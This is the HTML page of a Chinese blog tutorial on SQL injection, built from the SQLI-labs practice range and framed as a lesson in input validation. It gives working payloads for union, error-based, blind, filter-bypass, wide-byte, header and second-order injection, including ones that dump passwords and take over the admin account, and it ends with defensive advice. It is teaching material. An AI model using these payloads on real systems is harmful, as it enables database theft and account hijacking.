<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性 | Aaron Lin</title>
<meta name=keywords content><meta name=description content="学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性
以下实验均以 SQLI labs 靶场为例

1. 联合注入（Union-Based）
来自：Less-1

这是一个常见的查询页面。http://127.0.0.1/Less-1/?id=1 ，通过 id=1 传递参数。后端常见的 SQL 写法：SELECT * FROM users WHERE id='$id' LIMIT 0,1;
攻击者可以通过构造 id 的参数值，执行任意的 SQL 语句：

其中关键步骤是构造 1' --+：

通过某个具体参数 1 和 单引号 ' 来结束前面的语句：SELECT * FROM users WHERE id='，使其成为合法的 SQL 语句： SELECT * FROM users WHERE id='1'
通过 --+ 来注释后面的 ' LIMIT 0,1&#34;;

基于上面的原理，我们就可以在 1' 和 --+ 之间插入语句了，进行联合注入，具体步骤如下：


通过 order by 测列宽：?id=-1' order by 4 --+，通过不断尝试和错误提示可以得知列宽为 3



判断回显值对应的位置，?id=-1' union select 1,2,3 --+，2 和 3 这两个位置都可供使用
"><meta name=author content><link rel=canonical href=https://aaronlinv.github.io/posts/sql-injection/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.45e028aa8ce0961349adf411b013ee39406be2c0bc80d4ea3fc04555f7f4611a.css integrity="sha256-ReAoqozglhNJrfQRsBPuOUBr4sC8gNTqP8BFVff0YRo=" rel="preload stylesheet" as=style><link rel=icon href=https://aaronlinv.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://aaronlinv.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://aaronlinv.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://aaronlinv.github.io/apple-touch-icon.png><link rel=mask-icon href=https://aaronlinv.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://aaronlinv.github.io/posts/sql-injection/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://aaronlinv.github.io/posts/sql-injection/"><meta property="og:site_name" content="Aaron Lin"><meta property="og:title" content="永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性"><meta property="og:description" content="学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性
以下实验均以 SQLI labs 靶场为例
1. 联合注入（Union-Based） 来自：Less-1
这是一个常见的查询页面。http://127.0.0.1/Less-1/?id=1 ，通过 id=1 传递参数。后端常见的 SQL 写法：SELECT * FROM users WHERE id='$id' LIMIT 0,1;
攻击者可以通过构造 id 的参数值，执行任意的 SQL 语句：
其中关键步骤是构造 1' --+：
通过某个具体参数 1 和 单引号 ' 来结束前面的语句：SELECT * FROM users WHERE id='，使其成为合法的 SQL 语句： SELECT * FROM users WHERE id='1' 通过 --+ 来注释后面的 ' LIMIT 0,1&#34;; 基于上面的原理，我们就可以在 1' 和 --+ 之间插入语句了，进行联合注入，具体步骤如下：
通过 order by 测列宽：?id=-1' order by 4 --+，通过不断尝试和错误提示可以得知列宽为 3 判断回显值对应的位置，?id=-1' union select 1,2,3 --+，2 和 3 这两个位置都可供使用 "><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-02-25T21:02:50+08:00"><meta property="article:modified_time" content="2025-02-25T21:02:50+08:00"><meta property="og:image" content="https://aaronlinv.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://aaronlinv.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性"><meta name=twitter:description content="学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性
以下实验均以 SQLI labs 靶场为例

1. 联合注入（Union-Based）
来自：Less-1

这是一个常见的查询页面。http://127.0.0.1/Less-1/?id=1 ，通过 id=1 传递参数。后端常见的 SQL 写法：SELECT * FROM users WHERE id='$id' LIMIT 0,1;
攻击者可以通过构造 id 的参数值，执行任意的 SQL 语句：

其中关键步骤是构造 1' --+：

通过某个具体参数 1 和 单引号 ' 来结束前面的语句：SELECT * FROM users WHERE id='，使其成为合法的 SQL 语句： SELECT * FROM users WHERE id='1'
通过 --+ 来注释后面的 ' LIMIT 0,1&#34;;

基于上面的原理，我们就可以在 1' 和 --+ 之间插入语句了，进行联合注入，具体步骤如下：


通过 order by 测列宽：?id=-1' order by 4 --+，通过不断尝试和错误提示可以得知列宽为 3



判断回显值对应的位置，?id=-1' union select 1,2,3 --+，2 和 3 这两个位置都可供使用
"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://aaronlinv.github.io/posts/"},{"@type":"ListItem","position":2,"name":"永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性","item":"https://aaronlinv.github.io/posts/sql-injection/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性","name":"永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性","description":"学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性\n以下实验均以 SQLI labs 靶场为例\n1. 联合注入（Union-Based） 来自：Less-1\n这是一个常见的查询页面。http://127.0.0.1/Less-1/?id=1 ，通过 id=1 传递参数。后端常见的 SQL 写法：SELECT * FROM users WHERE id='$id' LIMIT 0,1;\n攻击者可以通过构造 id 的参数值，执行任意的 SQL 语句：\n其中关键步骤是构造 1' --+：\n通过某个具体参数 1 和 单引号 ' 来结束前面的语句：SELECT * FROM users WHERE id='，使其成为合法的 SQL 语句： SELECT * FROM users WHERE id='1' 通过 --+ 来注释后面的 ' LIMIT 0,1\u0026quot;; 基于上面的原理，我们就可以在 1' 和 --+ 之间插入语句了，进行联合注入，具体步骤如下：\n通过 order by 测列宽：?id=-1' order by 4 --+，通过不断尝试和错误提示可以得知列宽为 3 判断回显值对应的位置，?id=-1' union select 1,2,3 --+，2 和 3 这两个位置都可供使用 ","keywords":[],"articleBody":"学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性\n以下实验均以 SQLI labs 靶场为例\n1. 联合注入（Union-Based） 来自：Less-1\n这是一个常见的查询页面。http://127.0.0.1/Less-1/?id=1 ，通过 id=1 传递参数。后端常见的 SQL 写法：SELECT * FROM users WHERE id='$id' LIMIT 0,1;\n攻击者可以通过构造 id 的参数值，执行任意的 SQL 语句：\n其中关键步骤是构造 1' --+：\n通过某个具体参数 1 和 单引号 ' 来结束前面的语句：SELECT * FROM users WHERE id='，使其成为合法的 SQL 语句： SELECT * FROM users WHERE id='1' 通过 --+ 来注释后面的 ' LIMIT 0,1\"; 基于上面的原理，我们就可以在 1' 和 --+ 之间插入语句了，进行联合注入，具体步骤如下：\n通过 order by 测列宽：?id=-1' order by 4 --+，通过不断尝试和错误提示可以得知列宽为 3 判断回显值对应的位置，?id=-1' union select 1,2,3 --+，2 和 3 这两个位置都可供使用 在某个可回显的位置执行 select 语句：?id=-1' union select 1,2, database() --+ 你可以能会想，这又啥用呢？但实际上在没有严格权限管理的数据库上，我们可以通过构造下面语句获得所有库表的信息\n--+ 1. 查库：查询所有数据库的名称 SELECT schema_name FROM information_schema.schemata --+ 2. 查表：查询指定数据库中的所有表 SELECT table_name FROM information_schema.tables WHERE table_schema='security' --+ 3. 查列：查询表中的所有列 SELECT column_name FROM information_schema.columns WHERE table_name='users' --+ 4. 查字段：获取用户表中的敏感数据，如用户名和密码 SELECT username, password FROM security.users 举个例子：我们可以通过构造语句，获取所有的账户和密码，将其通过 ~ 进行分隔：?id=-1' union select 1,2, group_concat(concat_ws('~',username,password)) from security.users --+\n2. 报错注入（Error-Based） 来自：Less-5\n不是所有场景都会回显数据库值，那是否就安全了？攻击者可以通过显示的错误来获取数据库值\n--+ 0x7e 为 16 进制编码的 ~ SELECT updatexml(1, concat(0x7e, database()), 1) FROM DUAL; 通过函数构造错误，将期望的信息以错误的信息提示出来：?id=1' and updatexml(1,concat(0x7e,(database())),1) --+\nXPATH syntax error: '~security' 通过上面的错误我们就知道当前库名为：security，类似地可以执行任意语句\n3. 布尔盲注（Boolean-Based Blind） 来自：Less-7\n一般项目都会隐藏错误堆栈，只提示成功或者失败，可以使用布尔盲注：?id=1')) and left((select database()),1)='s'--+\n通过 order by 测列宽 ?id=1')) order by 4 --+ 通过 left 函数，逐个字符地遍历判断 ?id=1')) and left((select database()),1)='s'--+ ，当前库名首字母为 s 时会提示正确，否则提示错误 tips：这里使用的是 ?id=1')) 有别于前文的 1'，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误\n通过类似的原理我们可以按照行列顺序依次遍历：\n--+ 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号 ?id=1')) and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))\u003e1--+ 再配合二分法提高效率，最终也能得到所有库表信息\n4. 时间盲注（Time-Based Blind） 来自：Less-9\n如果没给出提示，或者无论正确与否都给出相同提示，那该怎么办呢？可以使用时间盲注\n在语句中调用 sleep() 函数，通过网页响应速度来判断是否为我们预期的结果\n构造 ?id=10' and sleep(5) --+ 来判断当前接口是否支持时间盲注，遍历过程与布尔盲注类似，增加了 if 函数，结果符合预期返回 1，否则执行 sleep(5)\n?id=1' and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))\u003e1112,1,sleep(5))--+ 5. 绕过过滤（Bypass） 来自：Less-25\n既然可以通过盲注来执行任意指令，那就直接加强参数的检查， 替换（或过滤）所有的 or 和 and\n攻击者可以通过双写的方式绕过：oorr → 被过滤后变为 or，也可以通过 || 替代 OR，\u0026\u0026 替代 AND\n--+ ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0 ?id=10' oorrder by 2;%00 6. 宽字节注入（GBK Bypass） 来自：Less-32\n既然替换保留字符也能被绕过，那就将参数中的单引号进行转义：' 转义为 \\'\n攻击者可以通过宽字节注入的方式使得转义符号失效，构造请求?id=1%df' order by 4 --+\n单引号 为 %27，而 \\ 为 %5c。PHP 后端在接受到参数时发现有单引号，就自动在其前面加上\\，变成 \\'，即 %5c%27\n我们在其前面加上 %df，构造出 %df\\'，即 %df%5c%27\n数据库使用 GBK 编码时 %df%5c 会被解码为 運，\\ 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 UTF-8 转换为 UTF-16 或 UTF-32，将 ’ 转为 UTF-16\n7. Header 注入（HTTP Header Injection） 来自：Less-18\n假设我严格地检查所有参数，那是否就安全了呢？\n攻击者可以在插入请求头信息时进行攻击，下面为常见的登陆信息收集，uagent 来自用户的请求头 User-Agent\n$insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; 在访问页面时构造 HTTP Header：User-Agent: 'and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'= '1，配合报错注入获得库表信息。类似的攻击还可以使用 Referer 和 Cookie 等等\n8. 二次注入（Second-Order） 来自：Less-24\n假设我们对所有参数和 HTTP Header 都严格检查，肯定就安全了吧？攻击者还可以通过二次注入的方式绕过你的检查\n这是一个经典的用户登陆页面，包含创建用户，登陆后可以修改用户密码\n修改密码的 SQL 如下：\nUPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' 攻击者可以通过构建用户 admin'#\n登陆该用户修改密码，实现间接修改掉 admin 超级用户的密码：\nUPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass' --+ 移除注释，等价于 UPDATE users SET PASSWORD='$pass' where username='admin' 结尾 我们可能觉得现代框架和工具链可以避免这些问题，但通过上面的例子可以感受到，道高一尺魔高一丈，稍有疏忽就可能被利用\nSQL注入的本质是：攻击者通过操控用户输入的方式，改变原本的SQL查询结构，从而绕过应用程序的安全策略，执行恶意指令。我们可以从不同的角度进行防御：\n校验用户输入 操作前进行详尽的校验包括已入库的数据 细化数据库账户权限 结合 WAF、日志监控、定期渗透测试 … SQL注入攻击揭示的不仅是技术漏洞，更指向一个通用安全原则：任何外部输入都可能在与现有流程交互时引发非预期行为。这一安全思维可迁移至日常生活风险防控体系：\n查杀未知邮件的附件 逐一检查合同 对陌生通知通过官方渠道二次确认 仔细评审合作方提供的材料 … 参考资料 本文只为抛砖引玉，精简了部分细节，详情可以参考以下教程：\nSQLI labs 靶场精简学习记录 sqli-labs基础教程/sqli-labs注入教程20200124.pptx sql注入之sqli-labs系列教程(less1-10) sqli-labs(62-65)-challenges-盲注 sqli-labs靶场Less-62题解（少于130次） ","wordCount":"408","inLanguage":"en","image":"https://aaronlinv.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-02-25T21:02:50+08:00","dateModified":"2025-02-25T21:02:50+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://aaronlinv.github.io/posts/sql-injection/"},"publisher":{"@type":"Organization","name":"Aaron Lin","logo":{"@type":"ImageObject","url":"https://aaronlinv.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://aaronlinv.github.io/ accesskey=h title="Aaron's Blog (Alt + H)">Aaron's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://aaronlinv.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://aaronlinv.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://aaronlinv.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://aaronlinv.github.io/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性</h1><div class=post-meta><span title='2025-02-25 21:02:50 +0800 +0800'>February 25, 2025</span></div></header><div class=post-content><p>学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性</p><p>以下实验均以 <a href=https://github.com/Audi-1/sqli-labs>SQLI labs</a> 靶场为例</p><hr><h3 id=1-联合注入union-based>1. 联合注入（Union-Based）<a hidden class=anchor aria-hidden=true href=#1-联合注入union-based>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-1>Less-1</a></p><p><img loading=lazy src=../sql-injection/1.png></p><p>这是一个常见的查询页面。<code>http://127.0.0.1/Less-1/?id=1</code> ，通过 <code>id=1</code> 传递参数。后端常见的 SQL 写法：<code>SELECT * FROM users WHERE id='$id' LIMIT 0,1;</code></p><p>攻击者可以通过构造 <code>id</code> 的参数值，执行任意的 SQL 语句：</p><p><img loading=lazy src=../sql-injection/2.png></p><p>其中关键步骤是构造 <code>1' --+</code>：</p><ol><li>通过某个具体参数 <code>1</code> 和 单引号 <code>'</code> 来结束前面的语句：<code>SELECT * FROM users WHERE id='</code>，使其成为合法的 SQL 语句： <code>SELECT * FROM users WHERE id='1'</code></li><li>通过 <code>--+</code> 来注释后面的 <code>' LIMIT 0,1";</code></li></ol><p>基于上面的原理，我们就可以在 <code>1'</code> 和 <code>--+</code> 之间插入语句了，进行联合注入，具体步骤如下：</p><ol><li><p>通过 <code>order by</code> 测列宽：<code>?id=-1' order by 4 --+</code>，通过不断尝试和错误提示可以得知列宽为 3
<img loading=lazy src=../sql-injection/3.png></p></li><li><p>判断回显值对应的位置，<code>?id=-1' union select 1,2,3 --+</code>，2 和 3 这两个位置都可供使用
<img loading=lazy src=../sql-injection/4.png></p></li><li><p>在某个可回显的位置执行 select 语句：<code>?id=-1' union select 1,2, database() --+</code>
<img loading=lazy src=../sql-injection/5.png></p></li></ol><p>你可以能会想，这又啥用呢？但实际上在没有<strong>严格权限管理</strong>的数据库上，我们可以通过构造下面语句获得所有库表的信息</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--+ 1. 查库：查询所有数据库的名称
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>schema_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>schemata</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--+ 2. 查表：查询指定数据库中的所有表
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;security&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--+ 3. 查列：查询表中的所有列
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--+ 4. 查字段：获取用户表中的敏感数据，如用户名和密码
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=k>security</span><span class=p>.</span><span class=n>users</span><span class=w>
</span></span></span></code></pre></div><p>举个例子：我们可以通过构造语句，获取所有的账户和密码，将其通过 <code>~</code> 进行分隔：<code>?id=-1' union select 1,2, group_concat(concat_ws('~',username,password)) from security.users --+</code></p><p><img loading=lazy src=../sql-injection/5-2.png></p><hr><h3 id=2-报错注入error-based>2. 报错注入（Error-Based）<a hidden class=anchor aria-hidden=true href=#2-报错注入error-based>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-5>Less-5</a></p><p>不是所有场景都会回显数据库值，那是否就安全了？攻击者可以通过显示的错误来获取数据库值</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--+ 0x7e 为 16 进制编码的 ~
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>SELECT</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=w> </span><span class=k>database</span><span class=p>()),</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>DUAL</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>通过函数构造错误，将期望的信息以错误的信息提示出来：<code>?id=1' and updatexml(1,concat(0x7e,(database())),1) --+</code></p><p><img loading=lazy src=../sql-injection/6.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~security&#39;</span><span class=w>
</span></span></span></code></pre></div><p>通过上面的错误我们就知道当前库名为：<code>security</code>，类似地可以执行任意语句</p><hr><h3 id=3-布尔盲注boolean-based-blind>3. 布尔盲注（Boolean-Based Blind）<a hidden class=anchor aria-hidden=true href=#3-布尔盲注boolean-based-blind>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-7>Less-7</a></p><p>一般项目都会隐藏错误堆栈，只提示成功或者失败，可以使用布尔盲注：<code>?id=1')) and left((select database()),1)='s'--+</code></p><ol><li>通过 order by 测列宽 <code>?id=1')) order by 4 --+</code></li><li>通过 left 函数，逐个字符地遍历判断 <code>?id=1')) and left((select database()),1)='s'--+ </code>，当前库名首字母为 <code>s</code> 时会提示正确，否则提示错误</li></ol><p>tips：这里使用的是 <code>?id=1'))</code> 有别于前文的 <code>1'</code>，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误</p><p>通过类似的原理我们可以按照行列顺序依次遍历：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--+ 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=s1>&#39;)) and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))&gt;1--+
</span></span></span></code></pre></div><p>再配合二分法提高效率，最终也能得到所有库表信息</p><h3 id=4-时间盲注time-based-blind>4. 时间盲注（Time-Based Blind）<a hidden class=anchor aria-hidden=true href=#4-时间盲注time-based-blind>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-9>Less-9</a></p><p>如果没给出提示，或者无论正确与否都给出相同提示，那该怎么办呢？可以使用时间盲注</p><p>在语句中调用 <code>sleep()</code> 函数，通过网页响应速度来判断是否为我们预期的结果</p><p>构造 <code>?id=10' and sleep(5) --+</code> 来判断当前接口是否支持时间盲注，遍历过程与布尔盲注类似，增加了 if 函数，结果符合预期返回 1，否则执行 sleep(5)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=s1>&#39; and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))&gt;1112,1,sleep(5))--+ 
</span></span></span></code></pre></div><hr><h3 id=5-绕过过滤bypass>5. 绕过过滤（Bypass）<a hidden class=anchor aria-hidden=true href=#5-绕过过滤bypass>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-25>Less-25</a></p><p>既然可以通过盲注来执行任意指令，那就直接加强参数的检查， 替换（或过滤）所有的 or 和 and</p><p>攻击者可以通过双写的方式绕过：<code>oorr</code> → 被过滤后变为 <code>or</code>，也可以通过 <code>||</code> 替代 <code>OR</code>，<code>&&</code> 替代 <code>AND</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--+ ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>id</span><span class=o>=</span><span class=mi>10</span><span class=s1>&#39; oorrder by 2;%00
</span></span></span></code></pre></div><hr><h3 id=6-宽字节注入gbk-bypass>6. 宽字节注入（GBK Bypass）<a hidden class=anchor aria-hidden=true href=#6-宽字节注入gbk-bypass>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-32>Less-32</a></p><p>既然替换保留字符也能被绕过，那就将参数中的单引号进行转义：<code>'</code> 转义为 <code>\'</code></p><p>攻击者可以通过宽字节注入的方式使得转义符号失效，构造请求<code>?id=1%df' order by 4 --+</code></p><p>单引号 为 <code>%27</code>，而 <code>\</code> 为 <code>%5c</code>。PHP 后端在接受到参数时发现有单引号，就自动在其前面加上<code>\</code>，变成 <code>\'</code>，即 <code>%5c%27</code></p><p>我们在其前面加上 <code>%df</code>，构造出 <code>%df\'</code>，即 <code>%df%5c%27</code></p><p>数据库使用 GBK 编码时 <code>%df%5c</code> 会被解码为 <code>運</code>，<code>\</code> 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 UTF-8 转换为 UTF-16 或 UTF-32，将 &rsquo; 转为 UTF-16</p><hr><h3 id=7-header-注入http-header-injection>7. Header 注入（HTTP Header Injection）<a hidden class=anchor aria-hidden=true href=#7-header-注入http-header-injection>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-18>Less-18</a></p><p>假设我严格地检查所有参数，那是否就安全了呢？</p><p>攻击者可以在插入请求头信息时进行攻击，下面为常见的登陆信息收集，<code>uagent</code> 来自用户的请求头 <code>User-Agent</code></p><pre tabindex=0><code>$insert=&#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&#34;;
</code></pre><p>在访问页面时构造 HTTP Header：<code>User-Agent: 'and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'= '1</code>，配合报错注入获得库表信息。类似的攻击还可以使用 <code>Referer</code> 和 <code>Cookie</code> 等等</p><hr><h3 id=8-二次注入second-order>8. 二次注入（Second-Order）<a hidden class=anchor aria-hidden=true href=#8-二次注入second-order>#</a></h3><p>来自：<a href=https://github.com/Audi-1/sqli-labs/tree/master/Less-24>Less-24</a></p><p>假设我们对所有参数和 HTTP Header 都严格检查，肯定就安全了吧？攻击者还可以通过二次注入的方式绕过你的检查</p><p>这是一个经典的用户登陆页面，包含创建用户，登陆后可以修改用户密码</p><p><img loading=lazy src=../sql-injection/7.png></p><p>修改密码的 SQL 如下：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UPDATE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>SET</span><span class=w> </span><span class=n>PASSWORD</span><span class=o>=</span><span class=s1>&#39;$pass&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;$username&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;$curr_pass&#39;</span><span class=w>
</span></span></span></code></pre></div><p>攻击者可以通过构建用户 <code>admin'#</code></p><p><img loading=lazy src=../sql-injection/8.png></p><p>登陆该用户修改密码，实现间接修改掉 <code>admin</code> 超级用户的密码：</p><p><img loading=lazy src=../sql-injection/9.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>UPDATE</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>SET</span><span class=w> </span><span class=n>PASSWORD</span><span class=o>=</span><span class=s1>&#39;$pass&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s1>&#39;admin&#39;</span><span class=o>#</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>password</span><span class=o>=</span><span class=s1>&#39;$curr_pass&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--+ 移除注释，等价于
